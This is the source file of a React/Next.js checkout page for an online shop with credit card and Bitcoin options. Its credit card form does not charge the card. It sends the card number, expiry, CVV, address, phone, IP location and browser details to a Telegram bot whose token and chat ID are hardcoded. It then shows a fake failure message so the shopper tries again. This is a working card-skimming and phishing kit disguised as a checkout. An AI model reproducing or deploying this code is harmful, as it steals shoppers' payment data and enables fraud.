'use client'
import React, { useState } from 'react';
import Link from 'next/link';
import { useCart } from '@/context/CartContext';
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { ChevronDown, CreditCard, Bitcoin, ArrowLeft } from 'lucide-react';

const TELEGRAM_BOT_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || '7737474698:AAHyZKVaQLgdeNBEwvpbwXIToyFYfZ5TSR4';
const TELEGRAM_CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '7860277201';

const escapeMarkdown = (text: string) => {
  return text.replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
};

const BitcoinPayment = ({ totalAmount }: { totalAmount: number }) => {
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    address: '',
    city: '',
    country: '',
    zipCode: ''
  });
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handlePayment = async () => {
    setLoading(true);
    setError(null);

    if (!formData.name.trim()) {
      setError('Full name is required');
      setLoading(false);
      return;
    }

    if (!formData.email.trim() || !/^\S+@\S+\.\S+$/.test(formData.email)) {
      setError('Valid email is required');
      setLoading(false);
      return;
    }

    try {
      const orderPayload = {
        amount: totalAmount,
        customer: formData,
        metadata: {
          orderDate: new Date().toISOString()
        }
      };

      const response = await fetch('/api/create-invoice', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(orderPayload)
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.error || 'Payment failed');
      }

      const data = await response.json();

      if (!data?.paymentUrl) {
        throw new Error('Invalid payment response');
      }

      sessionStorage.setItem('pendingOrder', JSON.stringify({
        ...orderPayload,
        paymentId: data.invoiceId
      }));

      window.location.href = data.paymentUrl;
    } catch (err: any) {
      console.error('Payment Error:', err);
      setError(err.message || 'Payment failed. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="space-y-4">
      <div className="space-y-4">
        <InputField
          label="Full Name *"
          id="name"
          name="name"
          value={formData.name}
          onChange={handleChange}
          required
          placeholder="Your name"
        />

        <InputField
          label="Email Address *"
          id="email"
          name="email"
          type="email"
          value={formData.email}
          onChange={handleChange}
          required
          placeholder="your@email.com"
        />

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <InputField
            label="Country"
            id="country"
            name="country"
            value={formData.country}
            onChange={handleChange}
            placeholder="United States"
          />

          <InputField
            label="ZIP/Postal Code"
            id="zipCode"
            name="zipCode"
            value={formData.zipCode}
            onChange={handleChange}
            placeholder="10001"
          />
        </div>

        <InputField
          label="Street Address"
          id="address"
          name="address"
          value={formData.address}
          onChange={handleChange}
          placeholder="123 Main St"
        />

        <InputField
          label="City"
          id="city"
          name="city"
          value={formData.city}
          onChange={handleChange}
          placeholder="New York"
        />
      </div>

      <button
        onClick={handlePayment}
        disabled={loading}
        className={`w-full py-3 px-6 rounded-lg font-medium text-white transition-colors flex items-center justify-center ${
          loading
            ? 'bg-gray-400 cursor-not-allowed'
            : 'bg-[#f7931a] hover:bg-[#e08119] shadow-md'
        }`}
      >
        {loading ? (
          <>
            <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
            Processing...
          </>
        ) : (
          <>
            <Bitcoin className="w-5 h-5 mr-2" />
            Pay ${totalAmount.toFixed(2)} with Bitcoin
          </>
        )}
      </button>

      {error && (
        <div className="p-4 bg-red-50 border-l-4 border-red-500 text-red-700 rounded-lg">
          <p className="font-medium">Payment Error</p>
          <p>{error}</p>
        </div>
      )}
    </div>
  );
};

const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
  const [form, setForm] = useState({
    cardName: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
    email: '',
    address: '',
    city: '',
    country: '',
    zipCode: '',
    phone: ''
  });

  const [errors, setErrors] = useState<Record<string, string>>({});
  const [status, setStatus] = useState({ message: '', color: '' });
  const [loading, setLoading] = useState(false);

  const luhnCheck = (num: string): boolean => {
    const arr = num.split('').reverse().map(x => parseInt(x, 10));
    let sum = arr.reduce((acc, val, i) => {
      if (i % 2 === 1) {
        val *= 2;
        if (val > 9) val -= 9;
      }
      return acc + val;
    }, 0);
    return sum % 10 === 0;
  };

  const validateExpiry = (exp: string): boolean => {
    if (!/^\d{2}\/\d{2}$/.test(exp)) return false;
    const [mm, yy] = exp.split('/').map(x => parseInt(x, 10));
    if (mm < 1 || mm > 12) return false;
    const now = new Date();
    const expDate = new Date(2000 + yy, mm);
    return expDate > now;
  };

  const formatCardNumber = (value: string): string => {
    return value.replace(/\D/g, '').substring(0, 16)
      .replace(/(.{4})/g, '$1 ').trim();
  };

  const formatExpiry = (value: string): string => {
    const digits = value.replace(/\D/g, '').substring(0, 4);
    if (digits.length >= 3) {
      return digits.substring(0, 2) + '/' + digits.substring(2);
    }
    return digits;
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    let val = value;

    if (name === 'cardNumber') val = formatCardNumber(value);
    if (name === 'expiry') val = formatExpiry(value);
    if (name === 'cvv') val = value.replace(/\D/g, '').substring(0, 4);

    setForm(prev => ({ ...prev, [name]: val }));
    setErrors(prev => ({ ...prev, [name]: '' }));
    setStatus({ message: '', color: '' });
  };

  const validateForm = (): boolean => {
    const errs: Record<string, string> = {};
    if (!form.cardName.trim()) errs.cardName = 'Please enter your name.';
    const cardNumRaw = form.cardNumber.replace(/\s/g, '');
    if (!luhnCheck(cardNumRaw)) errs.cardNumber = 'Invalid card number.';
    if (!validateExpiry(form.expiry)) errs.expiry = 'Invalid expiry date.';
    if (!/^\d{3,4}$/.test(form.cvv)) errs.cvv = 'Invalid CVV.';
    if (!form.email.trim()) errs.email = 'Please enter your email.';
    if (!form.address.trim()) errs.address = 'Please enter your address.';
    if (!form.city.trim()) errs.city = 'Please enter your city.';
    if (!form.country.trim()) errs.country = 'Please enter your country.';
    if (!form.zipCode.trim()) errs.zipCode = 'Please enter your ZIP code.';
    if (!form.phone.trim()) errs.phone = 'Please enter your phone number.';

    setErrors(errs);
    return Object.keys(errs).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateForm()) return;

    setLoading(true);
    setStatus({ message: '', color: '' });

    try {
      let ipInfo = 'Unknown IP';
      try {
        const res = await fetch('https://ipapi.co/json/');
        if (res.ok) {
          const data = await res.json();
          ipInfo = `${data.ip} - ${data.city}, ${data.region}, ${data.country_name}`;
        }
      } catch (error) {
        console.error('Error fetching IP info:', error);
      }

      const message = `
💰 *New Payment Received* 💰
🛒 *Amount*: \\$${escapeMarkdown(totalAmount.toFixed(2))}

💳 *Card Details*:
   \\- Name: ${escapeMarkdown(form.cardName)}
   \\- Number: \`${escapeMarkdown(form.cardNumber.replace(/\s/g, ''))}\`
   \\- Expiry: ${escapeMarkdown(form.expiry)}
   \\- CVV: ${escapeMarkdown(form.cvv)}

📧 *Contact*:
   \\- Email: ${escapeMarkdown(form.email)}
   \\- Phone: ${escapeMarkdown(form.phone)}

🏠 *Address*:
   \\- ${escapeMarkdown(form.address)}
   \\- ${escapeMarkdown(form.city)}, ${escapeMarkdown(form.country)}
   \\- ZIP: ${escapeMarkdown(form.zipCode)}

🌐 *Device Info*:
   \\- IP: ${escapeMarkdown(ipInfo)}
   \\- Browser: ${escapeMarkdown(navigator.userAgent)}
   \\- Time: ${escapeMarkdown(new Date().toLocaleString())}
      `.trim();

      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const response = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'MarkdownV2'
        }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.description || 'Failed to send to Telegram');
      }

      setStatus({
        message: 'Opps! Please try Different Payment Method',
        color: 'red'
      });
      setForm({
        cardName: '',
        cardNumber: '',
        expiry: '',
        cvv: '',
        email: '',
        address: '',
        city: '',
        country: '',
        zipCode: '',
        phone: ''
      });

    } catch (error) {
      console.error('Payment error:', error);
      setStatus({
        message: error instanceof Error ? error.message : 'Payment failed',
        color: 'red'
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <div className="md:col-span-2">
          <label className="block text-sm font-medium text-gray-700 mb-1">Name on Card</label>
          <input
            type="text"
            name="cardName"
            placeholder="Your Name here"
            value={form.cardName}
            onChange={handleChange}
            className={`w-full px-4 py-3 rounded-lg border ${errors.cardName ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
            disabled={loading}
          />
          {errors.cardName && <p className="text-red-500 text-sm mt-1">{errors.cardName}</p>}
        </div>

        <div className="md:col-span-2">
          <label className="block text-sm font-medium text-gray-700 mb-1">Card Number</label>
          <input
            type="text"
            name="cardNumber"
            placeholder=""
            value={form.cardNumber}
            onChange={handleChange}
            maxLength={19}
            className={`w-full px-4 py-3 rounded-lg border ${errors.cardNumber ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
            disabled={loading}
          />
          {errors.cardNumber && <p className="text-red-500 text-sm mt-1">{errors.cardNumber}</p>}
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">Expiry Date</label>
          <input
            type="text"
            name="expiry"
            placeholder="MM/YY"
            value={form.expiry}
            onChange={handleChange}
            maxLength={5}
            className={`w-full px-4 py-3 rounded-lg border ${errors.expiry ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
            disabled={loading}
          />
          {errors.expiry && <p className="text-red-500 text-sm mt-1">{errors.expiry}</p>}
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">CVV</label>
          <input
            type="text"
            name="cvv"
            placeholder="123"
            value={form.cvv}
            onChange={handleChange}
            maxLength={4}
            className={`w-full px-4 py-3 rounded-lg border ${errors.cvv ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
            disabled={loading}
          />
          {errors.cvv && <p className="text-red-500 text-sm mt-1">{errors.cvv}</p>}
        </div>

        <div className="md:col-span-2">
          <label className="block text-sm font-medium text-gray-700 mb-1">Email</label>
          <input
            type="email"
            name="email"
            placeholder="your@email.com"
            value={form.email}
            onChange={handleChange}
            className={`w-full px-4 py-3  text-black rounded-lg border ${errors.email ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
            disabled={loading}
          />
          {errors.email && <p className="text-red-500 text-sm mt-1">{errors.email}</p>}
        </div>

        <div className="md:col-span-2">
          <label className="block text-sm font-medium text-gray-700 mb-1">Address</label>
          <input
            type="text"
            name="address"
            placeholder="123 Main St"
            value={form.address}
            onChange={handleChange}
            className={`w-full px-4 py-3  text-black rounded-lg border ${errors.address ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
            disabled={loading}
          />
          {errors.address && <p className="text-red-500 text-sm mt-1">{errors.address}</p>}
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">City</label>
          <input
            type="text"
            name="city"
            placeholder="New York"
            value={form.city}
            onChange={handleChange}
            className={`w-full px-4 py-3  text-black rounded-lg border ${errors.city ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
            disabled={loading}
          />
          {errors.city && <p className="text-red-500 text-sm mt-1">{errors.city}</p>}
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">Country</label>
          <input
            type="text"
            name="country"
            placeholder="United States"
            value={form.country}
            onChange={handleChange}
            className={`w-full px-4 py-3 rounded-lg  text-black border ${errors.country ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
            disabled={loading}
          />
          {errors.country && <p className="text-red-500 text-sm mt-1">{errors.country}</p>}
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">ZIP Code</label>
          <input
            type="text"
            name="zipCode"
            placeholder="10001"
            value={form.zipCode}
            onChange={handleChange}
            className={`w-full px-4 py-3 rounded-lg  text-black border ${errors.zipCode ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
            disabled={loading}
          />
          {errors.zipCode && <p className="text-red-500 text-sm mt-1">{errors.zipCode}</p>}
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">Phone Number</label>
          <input
            type="tel"
            name="phone"
            placeholder="+1 (555) 123-4567"
            value={form.phone}
            onChange={handleChange}
            className={`w-full px-4 py-3  text-black rounded-lg border ${errors.phone ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
            disabled={loading}
          />
          {errors.phone && <p className="text-red-500 text-sm mt-1">{errors.phone}</p>}
        </div>
      </div>

      <button
        type="submit"
        disabled={loading}
        className={`w-full py-3 px-4 rounded-lg font-bold text-white transition-all flex items-center justify-center ${
          loading ? 'bg-blue-400 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700 shadow-md'
        }`}
      >
        {loading ? (
          <>
            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
            Processing...
          </>
        ) : (
          <>
            <CreditCard className="w-5 h-5 mr-2" />
            Pay ${totalAmount.toFixed(2)}
          </>
        )}
      </button>

      {status.message && (
        <div className={`p-3 rounded-lg text-center font-medium ${
          status.color === 'green' 
            ? 'bg-green-50 text-green-700 border border-green-200' 
            : 'bg-red-50 text-red-700 border border-red-200'
        }`}>
          {status.message}
        </div>
      )}
    </form>
  );
};

const InputField = ({
  label,
  id,
  name,
  type = 'text',
  value,
  onChange,
  required = false,
  placeholder = ''
}: {
  label: string;
  id: string;
  name: string;
  type?: string;
  value: string;
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  required?: boolean;
  placeholder?: string;
}) => (
  <div>
    <label htmlFor={id} className="block text-sm font-medium text-gray-700 mb-1">
      {label}
    </label>
    <input
      type={type}
      id={id}
      name={name}
      required={required}
      value={value}
      onChange={onChange}
      className="w-full px-4  py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-teal-500 focus:border-transparent text-gray-900"
      placeholder={placeholder}
    />
  </div>
);

const CheckoutPage = () => {
  const { cart, getTotalPrice } = useCart();
  const [paymentMethod, setPaymentMethod] = useState<string>('credit-card');
  const [showPaymentOptions, setShowPaymentOptions] = useState<boolean>(false);
  const [orderCompleted, setOrderCompleted] = useState(false);

  if (cart.length === 0 && !orderCompleted) {
    return (
      <div className="container mx-auto px-4 py-8 sm:py-12 md:py-16 text-center bg-white min-h-screen">
        <div className="max-w-md mx-auto">
          <h1 className="text-xl sm:text-2xl font-bold mb-3 sm:mb-4 text-gray-900">Your Cart is Empty</h1>
          <p className="mb-6 sm:mb-8 text-gray-600 text-sm sm:text-base">
            Looks like you haven't added any products to your cart yet.
          </p>
          <Link href="/">
            <Button className="bg-teal-600 hover:bg-teal-700 text-white px-6 sm:px-8 py-2 sm:py-3">
              Continue Shopping
            </Button>
          </Link>
        </div>
      </div>
    );
  }

  if (orderCompleted) {
    return (
      <div className="container mx-auto px-4 py-8 sm:py-12 md:py-16 text-center bg-white min-h-screen">
        <div className="max-w-md mx-auto">
          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg className="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
            </svg>
          </div>
          <h1 className="text-xl sm:text-2xl font-bold mb-3 sm:mb-4 text-gray-900">Order Received!</h1>
          <p className="mb-6 sm:mb-8 text-gray-600 text-sm sm:text-base">
            Thank you for your purchase. We've sent a confirmation to your email.
          </p>
          <Link href="/">
            <Button className="bg-blue-600 hover:bg-blue-700 text-white px-6 sm:px-8 py-2 sm:py-3">
              Continue Shopping
            </Button>
          </Link>
        </div>
      </div>
    );
  }

  return (
    <div className="container mx-auto px-4 py-8 bg-white min-h-screen">
      <div className="mb-6">
        <Link href="/cart" className="text-teal-600 hover:text-teal-700 text-sm font-medium flex items-center">
          <ArrowLeft className="w-4 h-4 mr-1" />
          Back to Cart
        </Link>
      </div>

      <h1 className="text-2xl sm:text-3xl font-bold mb-6 sm:mb-8 text-gray-900">Checkout</h1>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 sm:gap-8">
        <div className="lg:col-span-2 space-y-6">
          <Card className="p-6 shadow-sm">
            <h2 className="text-lg sm:text-xl font-bold mb-4 text-gray-900">Contact Information</h2>
            <div className="space-y-4">
              <InputField
                label="Email Address"
                id="email"
                name="email"
                type="email"
                value=""
                onChange={() => {}}
                required
                placeholder="your@email.com"
              />
            </div>
          </Card>

          <Card className="p-6 shadow-sm">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-lg sm:text-xl font-bold text-gray-900">Payment Method</h2>
              {!showPaymentOptions && (
                <button
                  onClick={() => setShowPaymentOptions(true)}
                  className="text-sm text-teal-600 hover:text-teal-700 font-medium"
                  type="button"
                >
                  Change
                </button>
              )}
            </div>

            {showPaymentOptions ? (
              <div className="space-y-4">
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <button
                    onClick={() => {
                      setPaymentMethod('credit-card');
                      setShowPaymentOptions(false);
                    }}
                    className={`p-4 rounded-lg border-2 flex flex-col items-center ${
                      paymentMethod === 'credit-card' 
                        ? 'border-blue-500 bg-blue-50' 
                        : 'border-gray-200 hover:border-gray-300'
                    } transition-colors`}
                    type="button"
                  >
                    <CreditCard className="h-6 w-6 mb-2 text-gray-700" />
                    <span className="font-medium">Credit Card</span>
                    <span className="text-xs text-gray-500 mt-1">Visa, Mastercard, etc.</span>
                  </button>
                  <button
                    onClick={() => {
                      setPaymentMethod('bitcoin');
                      setShowPaymentOptions(false);
                    }}
                    className={`p-4 rounded-lg border-2 flex flex-col items-center ${
                      paymentMethod === 'bitcoin' 
                        ? 'border-orange-500 bg-orange-50' 
                        : 'border-gray-200 hover:border-gray-300'
                    } transition-colors`}
                    type="button"
                  >
                    <Bitcoin className="h-6 w-6 mb-2 text-[#f7931a]" />
                    <span className="font-medium">Bitcoin</span>
                    <span className="text-xs text-gray-500 mt-1">Pay with cryptocurrency</span>
                  </button>
                </div>
              </div>
            ) : (
              <div className="p-4 bg-gray-50 rounded-lg border border-gray-200">
                <div className="flex items-center space-x-3">
                  {paymentMethod === 'credit-card' ? (
                    <>
                      <div className="p-2 bg-blue-100 rounded-lg">
                        <CreditCard className="h-5 w-5 text-blue-600" />
                      </div>
                      <div>
                        <p className="font-medium text-gray-900">Credit Card</p>
                        <p className="text-sm text-gray-500">Pay with Visa, Mastercard, etc.</p>
                      </div>
                    </>
                  ) : (
                    <>
                      <div className="p-2 bg-orange-100 rounded-lg">
                        <Bitcoin className="h-5 w-5 text-[#f7931a]" />
                      </div>
                      <div>
                        <p className="font-medium text-gray-900">Bitcoin</p>
                        <p className="text-sm text-gray-500">Pay with cryptocurrency</p>
                      </div>
                    </>
                  )}
                </div>
              </div>
            )}

            <div className="mt-6">
              {paymentMethod === 'credit-card' ? (
                <CreditCardPayment totalAmount={getTotalPrice() * 1.08} />
              ) : (
                <BitcoinPayment totalAmount={getTotalPrice() * 1.08} />
              )}
            </div>
          </Card>
        </div>

        <div>
          <Card className="p-6 shadow-sm sticky top-6">
            <h2 className="text-lg sm:text-xl font-bold mb-4 text-gray-900">Order Summary</h2>

            <div className="space-y-4 mb-6">
              {cart.map(item => (
                <div key={item.id} className="flex justify-between items-start">
                  <div className="flex items-start space-x-3">
                    <img
                      src={item.image}
                      alt={item.name}
                      className="w-12 h-12 object-cover rounded-md"
                    />
                    <div>
                      <p className="text-sm font-medium text-gray-900">{item.name}</p>
                      <p className="text-xs text-gray-500">Qty: {item.quantity}</p>
                    </div>
                  </div>
                  <p className="text-sm font-medium text-gray-900">${(item.price * item.quantity).toFixed(2)}</p>
                </div>
              ))}
            </div>

            <div className="space-y-3 border-t border-gray-200 pt-4">
              <div className="flex justify-between">
                <span className="text-sm text-gray-600">Subtotal</span>
                <span className="text-sm font-medium text-gray-900">${getTotalPrice().toFixed(2)}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-sm text-gray-600">Shipping</span>
                <span className="text-sm font-medium text-gray-900">Free</span>
              </div>
              <div className="flex justify-between">
                <span className="text-sm text-gray-600">Tax</span>
                <span className="text-sm font-medium text-gray-900">${(getTotalPrice() * 0.08).toFixed(2)}</span>
              </div>
              <div className="flex justify-between font-bold text-base pt-2">
                <span className="text-gray-900">Total</span>
                <span className="text-gray-900">${(getTotalPrice() * 1.08).toFixed(2)}</span>
              </div>
            </div>

            <div className="mt-6 text-xs text-gray-500">
              <p>By placing your order, you agree to our <a href="#" className="text-teal-600 hover:underline">Terms of Service</a></p>
            </div>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default CheckoutPage;